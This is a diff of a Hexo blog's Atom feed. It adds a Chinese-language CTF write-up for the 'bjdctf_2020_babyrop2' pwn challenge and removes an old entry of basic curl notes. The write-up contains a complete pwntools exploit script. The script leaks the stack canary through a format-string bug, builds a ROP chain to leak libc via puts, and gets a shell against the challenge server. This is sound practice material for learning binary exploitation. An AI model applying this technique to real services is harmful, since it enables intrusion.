@@ -6,7 +6,7 @@
   <link href="https://pr0b1em.github.io/atom.xml" rel="self"/>
   
   <link href="https://pr0b1em.github.io/"/>
-  <updated>2021-07-17T02:56:44.920Z</updated>
+  <updated>2021-07-18T03:11:44.390Z</updated>
   <id>https://pr0b1em.github.io/</id>
   
   <author>
@@ -15,6 +15,25 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>bjdctf_2020_babyrop2</title>
+    <link href="https://pr0b1em.github.io/2021/07/18/bjdctf-2020-babyrop2/"/>
+    <id>https://pr0b1em.github.io/2021/07/18/bjdctf-2020-babyrop2/</id>
+    <published>2021-07-18T03:08:33.000Z</published>
+    <updated>2021-07-18T03:11:44.390Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h1><p>检查保护机制，开了NX和canary，64位</p><p><img src="/img/image-20210718104136221.png" alt="image-20210718104136221"></p><p>IDA打开，查看main函数，发现里面利用到了三个函数</p><p><img src="/img/image-20210718104243834.png" alt="image-20210718104243834"></p><p>init函数，初始化输出提示</p><p><img src="/img/image-20210718104312978.png" alt="image-20210718104312978"></p><p>gift函数，存在格式化字符串漏洞</p><p><img src="/img/image-20210718104333802.png" alt="image-20210718104333802"></p><p>vuln函数，存在栈溢出漏洞</p><p><img src="/img/image-20210718104359430.png" alt="image-20210718104359430"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><h5 id="可利用gift函数的格式化字符串漏洞，泄露canary的值"><a href="#可利用gift函数的格式化字符串漏洞，泄露canary的值" class="headerlink" title="可利用gift函数的格式化字符串漏洞，泄露canary的值"></a>可利用<code>gift</code>函数的格式化字符串漏洞，泄露<code>canary</code>的值</h5><p>得到偏移量为7</p><p><img src="/img/image-20200826223512973.png"></p><p>没有发现system和’/bin/sh’，只有通过vuln函数栈溢出漏洞，泄露libc地址，然后得到</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27304</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bjdctf_2020_babyrop2&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">&quot;vuln&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x400993</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%7$p&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;u!&quot;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p64(canary) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;story!&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p64(canary) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;story!&quot;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/image-20210718110410868.png" alt="image-20210718110410868"></p>]]></content>
+    
+    
+    <summary type="html">libc泄露|格式化字符串漏洞</summary>
+    
+    
+    
+    <category term="writeup" scheme="https://pr0b1em.github.io/categories/writeup/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>picoctf_2018_rop</title>
@@ -373,25 +392,6 @@
     
     
     <category term="日常闲话" scheme="https://pr0b1em.github.io/categories/%E6%97%A5%E5%B8%B8%E9%97%B2%E8%AF%9D/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>CURL</title>
-    <link href="https://pr0b1em.github.io/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/"/>
-    <id>https://pr0b1em.github.io/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</id>
-    <published>2021-06-17T10:17:26.000Z</published>
-    <updated>2021-06-18T03:16:53.895Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span><p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>]]></content>
-    
-    
-    <summary type="html">curl常用方法</summary>
-    
-    
-    
-    <category term="笔记" scheme="https://pr0b1em.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
     
     
   </entry>
